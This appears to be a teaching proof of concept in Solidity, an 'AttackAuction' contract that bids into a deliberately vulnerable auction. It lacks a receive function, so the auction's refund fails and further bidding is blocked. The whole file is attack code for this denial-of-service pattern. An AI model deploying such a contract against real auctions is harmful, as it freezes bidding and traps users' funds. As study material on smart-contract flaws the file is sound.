// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.28;

import "./Auction.sol";

contract AttackAuction {
    Auction private auction;

    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    // we call twice
    // the refund is triggered
    // but no receive is present
    function wreckAuction() public payable {
        auction.vulnerableBid{value: msg.value}();
    }

}